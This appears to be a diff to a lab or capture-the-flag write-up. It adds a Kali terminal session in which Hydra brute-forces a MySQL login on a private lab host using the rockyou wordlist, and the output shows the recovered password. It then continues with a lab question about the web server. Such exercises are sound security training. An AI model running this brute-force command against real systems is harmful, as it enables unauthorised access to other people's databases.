@@ -294,6 +294,25 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-23 13:43:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-23 13:43:02
 ```
 
+KALI:
+```
+┌──(osboxes㉿osboxes)-[~]
+└─$ sudo hydra -s 3306 -l toor -P /usr/share/wordlists/rockyou.txt mysql://172.30.0.15
+[sudo] password for osboxes: 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 07:37:40
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking mysql://172.30.0.15:3306/
+[3306][mysql] host: 172.30.0.15   login: toor   password: summer
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-07 07:37:44
+```
+
 - What webserver software is running on web?
 
 Apache httpd 2.4.62 ((AlmaLinux))
